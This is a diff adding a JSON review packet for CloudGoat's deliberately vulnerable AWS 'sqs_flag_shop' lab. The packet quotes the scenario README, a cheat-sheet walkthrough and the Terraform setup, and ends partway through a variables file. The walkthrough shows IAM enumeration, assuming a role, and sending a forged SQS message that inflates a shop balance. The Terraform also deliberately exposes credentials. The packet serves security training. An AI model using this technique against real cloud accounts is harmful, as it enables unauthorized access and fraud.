@@ -1,0 +1,196 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "302769ba038fda16713414a302646b482f6e0b9454a34a9344228f19b05401cc",
+  "case_id": "cloudgoat:aws:sqs_flag_shop",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:sqs_flag_shop",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "sqs_flag_shop",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/cheat_sheet.md"
+    ],
+    "terraform_file_count": 11,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/",
+    "review_score": 23,
+    "independence_group": "cloudgoat-scenario:sqs_flag_shop",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/README.md",
+      "member_sha256": "332141a34d184b85d0c5223e4569b5b4e342ddc5a9a9fe1732c3301beae0f6ef",
+      "bytes": 1270,
+      "content_kind": "md",
+      "text": "\r\n# Scenario : SQS_FLAG_Shop\r\n\r\n**Size:** Medium\r\n**Difficulty:** Easy\r\n\r\n**Command:** `$ ./cloudgoat.py create sqs_flag_shop`\r\n\r\n### Scenario Resources\r\n\r\n- 1 VPC with:\r\n    - Lambda  x 1\r\n    - RDS x1\r\n    - EC2 x1\r\n- SQS\r\n- IAM Users x 1\r\n\r\n### Scenario Start(s)\r\n\r\n1 IAM User, Web address\r\n\r\n## Scenario Goal(s)\r\n\r\nBuy FLAG successfully on the shop site\r\n\r\n## Summary\r\n\r\nThe first web page will be provided. Attackers check the privileges they currently have and perform privilege escalation. Find and analyze the hidden web source code, and think about how you can buy “FLAG” using the privileges you have!\r\n\r\n## Exploitation Route(s)\r\n\r\n![Scenario Route(s)](assets/route.png)\r\n\r\n## Route Walkthrough\r\n\r\n1. The attacker accesses the web page and identifies the features first\r\n2. The attacker checks the privileges it has\r\n3. Find the web source code. By analyzing the source code, the attacker checks the format of message sent to the SQS service\r\n4. Assume the the sending message role about SQS service\r\n5. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue\r\n6. Check the changed assets, purchase FLAG and check the secret-string\r\n\r\n**A cheat sheet for this route is available [here](cheat_sheet.md)**\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/cheat_sheet.md",
+      "member_sha256": "d6cce2a52d04179f17a0c3c1cd96ab9b1ae436bc621dc7ddbdab3cedb779e87b",
+      "bytes": 5930,
+      "content_kind": "md",
+      "text": "# CloudGoat Walkthrough: SQS Flag Shop Scenario\r\n\r\n## Deploying the Scenario\r\n\r\nOnce the Terraform process is complete, the starting data for the scenario will be provided. The output will look like:\r\n\r\n```\r\n[cloudgoat] terraform output completed with no error code.\r\ncg_web_site_ip = 34.XXX.XXX.XXX:XXXX\r\ncloudgoat_output_sqsuser_access_key_id = AKIXXXXXXXXXXXXXXXXX\r\ncloudgoat_output_sqsuser_secret_key = isbXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\n```\r\n\r\n## Setting Up AWS Profile\r\n\r\nThe scenario provides a set of AWS credentials. Let’s create an AWS profile on the command line:\r\n\r\n```sh\r\n$ aws configure --profile sqs_user\r\n\r\nAWS Access Key ID [******************QP]:\r\nAWS Secret Access Key [******************2U]:\r\nDefault region name [us-east-1]:\r\nDefault output format [json]:\r\n```\r\n\r\nAfter setting up the profile for an AWS account, the first command to run is the AWS equivalent to ‘whoami’ so we can understand more about our user.\r\n\r\n```sh\r\n$ aws --profile sqs_user sts get-caller-identity\r\n\r\n{\r\n    \"UserId\": \"XXXXXXXXXXXXXXXXXXZF4\",\r\n    \"Account\": \"XXXXXXXXXXXX\",\r\n    \"Arn\": \"arn:aws:iam::XXXXXXXX:user/cg-sqs-user-sqs_flag_shop_cgidbXXXXXXXXX\"\t \r\n}\r\n```\r\n\r\nThis returns a JSON object containing:\r\n\r\n- **UserId**\r\n- **Account**\r\n- **Arn**\r\n\r\nMore information about **Amazon Resource Names (ARNs)** can be found in the [AWS Documentation](https://docs.aws.amazon.com/).\r\n\r\n## Enumerating User Policies\r\n\r\nAWS policies define permissions for identities and resources. Let’s see what policies are associated with our user:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam list-user-policies --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXX\r\n\r\n{\r\n   \"PolicyNames\": [\r\n      \"cg-sqs-scenario-assumed-role-policy\"\r\n    ]\r\n}\r\n```\r\n\r\nThis user has one attached policy. Let’s view its contents:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam get-user-policy --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX --policy-name cg-sqs-scenario-assumed-role-policy\r\n\r\n{\r\n   \"UserName\": \"cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX\",\r\n   \"PolicyName\": \"cg-sqs-scenario-assumed-role-policy\",\r\n   \"PolicyDocument\": {\r\n       \"Version\": \"2012-10-17\",\r\n       \"Statement\": [\r\n           {\r\n               \"Action\": [\r\n                   \"iam:Get*\",\r\n                   \"iam:List*\"\r\n               ],\r\n               \"Effect\": \"Allow\",\r\n               \"Resource\": \"*\",\r\n               \"Sid\": \"VisualEditor0\"\r\n           },\r\n           {\r\n               \"Action\": \"sts:AssumeRole\",\r\n               \"Effect\": \"Allow\",\r\n               \"Resource\": \"arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role\",\r\n               \"Sid\": \"VisualEditor1\"\r\n           }\r\n       ]\r\n   }\r\n}\r\n```\r\n\r\nThis policy allows us to assume a role! Let’s check the policies attached to that role:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam list-role-policies --role-name cg-sqs_send_msg_role\r\n\r\n{\r\n    \"PolicyNames\": [\r\n        \"cg-sqs_scenario_policy\"\r\n    ]\r\n}\r\n```\r\n\r\nThe role `cg-sqs_send_msg_role` has the attached policy `cg-sqs_scenario_policy`. Let’s inspect it:\r\n\r\n```sh\r\n$ aws --profile sqs_user iam get-role-policy --role-name cg-sqs_send_msg_role --policy-name cg-sqs_scenario_policy\r\n\r\n{\r\n\t\"RoleName\": \"cg-sqs_send_msg_role\",\r\n\t\"PolicyName\": \"cg-sqs_scenario_policy\",\r\n\t\"PolicyDocument\": {\r\n    \t\"Version\": \"2012-10-17\",\r\n    \t\"Statement\": [\r\n        \t{\r\n            \t\"Action\": [\r\n                \t\"sqs:GetQueueUrl\",\r\n                \t\"sqs:SendMessage\"\r\n            \t],\r\n            \t\"Effect\": \"Allow\",\r\n            \t\"Resource\": \"arn:aws:sqs:us-east-1:XXXXXXXXXXXX:cash_charging_queue\",\r\n            \t\"Sid\": \"VisualEditor0\"\r\n        \t}\r\n    \t]\r\n\t}\r\n}\r\n```\r\n\r\n## Assuming the SQS Role\r\n\r\nSince we can assume the role, let's do it:\r\n\r\n```sh\r\n$ aws --profile sqs_user sts assume-role --role-arn arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role --role-session-name sqs_send_role\r\n\r\n{\r\n\t\"Credentials\": {\r\n    \t\"AccessKeyId\": \"XXXXXXXXXXXXXXXXLOT5\",\r\n    \t\"SecretAccessKey\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXQPgU\",\r\n    \t\"SessionToken\": \"XXX...XXX\" ,\r\n    \t\"Expiration\": \"2024-02-08T23:29:43+00:00\"\r\n\t},\r\n\t\"AssumedRoleUser\": {\r\n    \t\"AssumedRoleId\": \"XXXXXXXXXXXXXXXXXX2GJ:sqs_send_role\",\r\n    \t\"Arn\": \"arn:aws:sts::XXXXXXXXXXXX:assumed-role/cg-sqs_send_msg_role/sqs_send_role\"\r\n\t}\r\n}\r\n```\r\n\r\nConfigure an AWS profile for this assumed role:\r\n\r\n```\r\n[sqs_send_role]\r\naws_access_key_id = ASIAXXXXXXXXXXXXXXXX\r\naws_secret_access_key = WmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\r\naws_session_token = IQoXXXXXXXX...\r\n```\r\n\r\n## Finding the SQS Queue URL\r\n\r\n```sh\r\n$ aws --profile sqs_send_role sqs get-queue-url --queue-name cash_charging_queue\r\n\r\n{\r\n    \"QueueUrl\": \"https://sqs.us-east-1.amazonaws.com/XXXXXXXX/cash_charging_queue\"\r\n}\r\n```\r\n\r\n## Web Application Analysis\r\n\r\nVisiting the `cg_web_site_ip` in a browser displays a shopping website. Analyzing the network requests reveals a **POST request** when ordering a banana. The website's source code contains a function for `charge_cash`, which accepts a JSON message:\r\n\r\n```json\r\n{\r\n    \"charge_amount\": 100000000\r\n}\r\n```\r\n\r\n## Sending an SQS Message\r\n\r\nWe can send a message to the queue using:\r\n\r\n```sh\r\n$ aws --profile sqs_send_role sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/XXXXXXX/cash_charging_queue --message-body '{\"charge_amount\": 100000000}'\r\n\r\n{\r\n\t\"MD5OfMessageBody\": \"a539XXXXXXXXXXXXXXXXXXXXXXXXXXXX\",\r\n\t\"MessageId\": \"67dcXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\"\r\n}\r\n```\r\n\r\nRefreshing the web application now reflects the increased balance, allowing us to purchase the flag.\r\n\r\n## Conclusion\r\n\r\nIn this **SQS Flag Shop CloudGoat scenario**, we:\r\n\r\n1. Enumerated user permissions.\r\n2. Assumed a new role with additional permissions.\r\n3. Analyzed the web application to discover its internal logic.\r\n4. Sent a crafted AWS SQS message to increase balance and obtain the flag.\r\n\r\nThis walkthrough demonstrates how to leverage AWS IAM and SQS permissions in cloud security challenges.\r\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/manifest.yml",
+      "member_sha256": "4ff304af024ca5d2d000e680aa80afe01aea0ac4fdbaab8d00df4a0af8641eea",
+      "bytes": 573,
+      "content_kind": "yml",
+      "text": "---\n# The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: sqs_flag_shop\n# The name of the author(s), comma separated\n- author: Best of the Best 12th CGV Team(Yong Siwoo, Park Do Kyu, Park Seo Hyun, Jung Ho Shim, Chae Jinsoo)\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.1\n# Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 11-05-2024\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/data.tf",
+      "member_sha256": "4c16b3a4e0f811f2bfe78c3f4a662ae37814d8242351de2dde8d03aac1668fa3",
+      "bytes": 603,
+      "content_kind": "tf",
+      "text": "data \"archive_file\" \"flask_app\" {\n  type        = \"zip\"\n  output_path = \"my_flask_app.zip\"\n  source_dir  = \"source/flask/\"\n}\n\ndata \"archive_file\" \"lambda_function\" {\n  type        = \"zip\"\n  source_file = \"source/lambda_function.py\"\n  output_path = \"source/lambda_function.zip\"\n}\n\n\ndata \"aws_ami\" \"ubuntu_image\" {\n  owners      = [\"amazon\"]\n  most_recent = true\n\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-*-amd64-server-*\"]\n  }\n\n  filter {\n    name   = \"root-device-type\"\n    values = [\"ebs\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/ec2.tf",
+      "member_sha256": "15099f604b123fb0557eea941fcd1f031af419395bed4b826d64c893804dcfb9",
+      "bytes": 2185,
+      "content_kind": "tf",
+      "text": "resource \"aws_key_pair\" \"bob_ec2\" {\n  key_name   = \"cg-ec2-${var.cgid}\"\n  public_key = file(var.ssh_public_key)\n}\n\n\nresource \"aws_instance\" \"flag_shop_server\" {\n  ami           = data.aws_ami.ubuntu_image.id\n  instance_type = \"t3.micro\"\n  key_name      = aws_key_pair.bob_ec2.key_name\n\n  subnet_id                   = aws_subnet.public_1.id\n  associate_public_ip_address = true\n\n  vpc_security_group_ids = [\n    aws_security_group.ec2.id\n  ]\n\n  root_block_device {\n    volume_type           = \"gp3\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  provisioner \"file\" {\n    source      = data.archive_file.flask_app.output_path\n    destination = \"/home/ubuntu/my_flask_app.zip\"\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  provisioner \"file\" {\n    source      = \"source/initialize_database.sql\"\n    destination = \"/home/ubuntu/initialize_database.sql\"\n\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  user_data = <<-EOF\n        #!/bin/bash\n\n        echo 'export AWS_ACCESS_KEY_ID=${aws_iam_access_key.web_sqs_manager.id}' >> /etc/environment\n        echo 'export AWS_SECRET_ACCESS_KEY=${aws_iam_access_key.web_sqs_manager.secret}' >> /etc/environment\n        echo 'export AWS_RDS=${aws_db_instance.rds.address}' >> /etc/environment\n        echo 'export AWS_SQS_URL=${aws_sqs_queue.cash_charge.url}' >> /etc/environment\n        echo 'export auth=${var.sqs_auth}' >> /etc/environment\n\n        sudo apt update\n        sudo apt install -y mysql-client python3-pip unzip\n        sudo pip3 install boto3 Flask pymysql\n        cd /home/ubuntu\n        mysql -h ${aws_db_instance.rds.address} -u ${var.database_username} -p${var.database_password} cash < /home/ubuntu/initialize_database.sql\n        unzip my_flask_app.zip\n        chmod -R +x my_flask_app/*.py\n        cd my_flask_app\n        sudo python3 app.py\n        EOF\n\n  volume_tags = {\n    Name = \"cg-${var.cgid}-ec2\"\n  }\n  tags = {\n    Name = \"cg-linux-ec2-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/iam.tf",
+      "member_sha256": "84ba3858886be4ba4329e5a9925ae5651d4553dcd9be245ff4e1a82973cb4666",
+      "bytes": 2314,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_user\" \"web_sqs_manager\" {\n  name = \"cg-web-sqs-manager-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"web_sqs_manager\" {\n  user = aws_iam_user.web_sqs_manager.name\n}\n\nresource \"aws_iam_policy_attachment\" \"user_sqs_full_access\" {\n  name       = \"SQSFullAccessAttachment\"\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonSQSFullAccess\"\n  users      = [aws_iam_user.web_sqs_manager.name]\n}\n\n\nresource \"aws_iam_user\" \"sqs\" {\n  name = \"cg-sqs-user-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"sqs\" {\n  user = aws_iam_user.sqs.name\n}\n\nresource \"aws_iam_user_policy\" \"sqs_scenario_assumed_role\" {\n  name = \"cg-sqs-scenario-assumed-role\"\n  user = aws_iam_user.sqs.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"iam:Get*\",\n          \"iam:List*\"\n        ]\n        Resource = \"*\"\n      },\n      {\n        Effect   = \"Allow\"\n        Action   = \"sts:AssumeRole\"\n        Resource = aws_iam_role.sqs_send_message.arn\n      }\n    ]\n  })\n}\n\n\n\nresource \"aws_iam_role\" \"sqs_lambda\" {\n  name = \"cg-sqs-lambda-${var.cgid}\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Action = \"sts:AssumeRole\"\n      Effect = \"Allow\"\n      Principal = {\n        Service = \"lambda.amazonaws.com\"\n      }\n    }]\n  })\n}\n\nresource \"aws_iam_role_policy_attachments_exclusive\" \"sqs_lambda\" {\n  role_name = aws_iam_role.sqs_lambda.name\n  policy_arns = [\n    \"arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole\",\n    \"arn:aws:iam::aws:policy/service-role/AWSLambdaSQSQueueExecutionRole\"\n  ]\n}\n\n\nresource \"aws_iam_role\" \"sqs_send_message\" {\n  name = \"cg-sqs-send-message-${var.cgid}\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          AWS = aws_iam_user.sqs.arn\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role_policy\" \"sqs_scenario\" {\n  name = \"cg-sqs\"\n  role = aws_iam_role.sqs_send_message.id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"sqs:GetQueueUrl\",\n          \"sqs:SendMessage\"\n        ]\n        Resource = aws_sqs_queue.cash_charge.arn\n      }\n    ]\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/lambda.tf",
+      "member_sha256": "0f40a36b31ab3f0dfbf4aa45808f0422271606163f331bfe767427d86859b4bd",
+      "bytes": 903,
+      "content_kind": "tf",
+      "text": "locals {\n  function_name = \"cache-charge\"\n}\n\n\nresource \"aws_lambda_function\" \"charging_cash_lambda\" {\n  function_name = \"${local.function_name}-${var.cgid}\"\n  handler       = \"lambda_function.lambda_handler\"\n  role          = aws_iam_role.sqs_lambda.arn\n  runtime       = \"python3.12\"\n\n  filename         = data.archive_file.lambda_function.output_path\n  source_code_hash = filebase64sha256(data.archive_file.lambda_function.output_path)\n\n  timeout = 15\n\n  environment {\n    variables = {\n      web_url = \"http://${aws_instance.flag_shop_server.private_ip}:5000/sqs_process\"\n      auth    = var.sqs_auth\n    }\n  }\n\n  vpc_config {\n    subnet_ids = [\n      aws_subnet.public_1.id\n    ]\n\n    security_group_ids = [\n      aws_security_group.lambda.id\n    ]\n  }\n}\n\nresource \"aws_cloudwatch_log_group\" \"lambda_logs\" {\n  name         = \"/aws/lambda/${local.function_name}-${var.cgid}\"\n  skip_destroy = false\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/output.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/output.tf",
+      "member_sha256": "8d72ecab2e064627bcbb397e8c45c151849d272bc0403a541458095e8da9d0ce",
+      "bytes": 294,
+      "content_kind": "tf",
+      "text": "output \"cloudgoat_output_sqsuser_access_key_id\" {\n  value = aws_iam_access_key.sqs.id\n}\n\noutput \"cloudgoat_output_sqsuser_secret_key\" {\n  value     = aws_iam_access_key.sqs.secret\n  sensitive = true\n}\n\noutput \"web_site_ip\" {\n  value = \"http://${aws_instance.flag_shop_server.public_ip}:5000\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/provider.tf",
+      "member_sha256": "76372a99f2e08eafd93df45873e6d4573d89ccf2912a62701a5519603835b5f7",
+      "bytes": 409,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.6\"\n    }\n\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.74.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/rds.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/rds.tf",
+      "member_sha256": "fdd5e00724419550b904f1025ba4920d814eebab4d9d8d3444e550cc2c9fa240",
+      "bytes": 827,
+      "content_kind": "tf",
+      "text": "resource \"aws_db_instance\" \"rds\" {\n  allocated_storage    = 20\n  storage_type         = \"gp2\"\n  engine               = \"mysql\"\n  engine_version       = \"8.0\"\n  instance_class       = \"db.t3.micro\"\n  db_subnet_group_name = aws_db_subnet_group.this.id\n  db_name              = var.database_name\n  username             = var.database_username\n  password             = var.database_password\n  parameter_group_name = \"default.mysql8.0\"\n  publicly_accessible  = false\n  skip_final_snapshot  = true\n\n  port = 3306\n\n  storage_encrypted = true\n\n  vpc_security_group_ids = [\n    aws_security_group.rds.id\n  ]\n}\n\n\nresource \"aws_db_subnet_group\" \"this\" {\n  name        = \"cg-rds-subnet-group-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Subnet Group\"\n\n  subnet_ids = [\n    aws_subnet.private_1.id,\n    aws_subnet.private_2.id\n  ]\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/security_groups.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/security_groups.tf",
+      "member_sha256": "abbd172f4fd07eb9415549989def2f1b1cb70ed054b0298faf72206063e9ba20",
+      "bytes": 1816,
+      "content_kind": "tf",
+      "text": "resource \"aws_security_group\" \"ec2\" {\n  name        = \"cg-ec2-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = concat([aws_vpc.vpc.cidr_block], var.cg_whitelist)\n  }\n  ingress {\n    from_port   = 5000\n    to_port     = 5000\n    protocol    = \"tcp\"\n    cidr_blocks = concat([aws_vpc.vpc.cidr_block], var.cg_whitelist)\n  }\n  ingress {\n    from_port       = 5000\n    to_port         = 5000\n    protocol        = \"tcp\"\n    security_groups = [aws_security_group.lambda.id]\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-ec2-${var.cgid}\"\n  }\n}\n\n\nresource \"aws_security_group\" \"rds\" {\n  name        = \"cg-rds-mysql-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for MySQL RDS Instance\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port = 3306\n    to_port   = 3306\n    protocol  = \"tcp\"\n    cidr_blocks = [\n      \"10.10.10.0/24\",\n      \"10.10.20.0/24\",\n      \"10.10.30.0/24\",\n      \"10.10.40.0/24\"\n    ]\n  }\n  ingress {\n    from_port   = 3306\n    to_port     = 3306\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-rds-mysql-${var.cgid}\"\n  }\n}\n\n\nresource \"aws_security_group\" \"lambda\" {\n  name        = \"cg-lambda-${var.cgid}\"\n  description = \"Security group for Lambda function\"\n  vpc_id      = aws_vpc.vpc.id\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  tags = {\n    Name = \"cg-lambda-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/sqs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/sqs.tf",
+      "member_sha256": "d1ac940a5f95e283ad492becbf52cdf53988a10b05b2f2eb229bed1dc155a71c",
+      "bytes": 474,
+      "content_kind": "tf",
+      "text": "resource \"aws_sqs_queue\" \"cash_charge\" {\n  name                      = \"cash_charging_queue\"\n  delay_seconds             = 0\n  max_message_size          = 1024\n  message_retention_seconds = 345600\n  receive_wait_time_seconds = 0\n  sqs_managed_sse_enabled   = true\n}\n\nresource \"aws_lambda_event_source_mapping\" \"sqs_event_mapping\" {\n  event_source_arn = aws_sqs_queue.cash_charge.arn\n  function_name    = aws_lambda_function.charging_cash_lambda.arn\n  batch_size       = 1\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sqs_flag_shop/terraform/variables.tf",
+      "member_sha256": "eb73fe5cc1b480f59725ed6c61d3fa482c62b8ff6acdd19be78b2752438ebb12",
+      "bytes": 1365,
+      "content_kind": "tf",
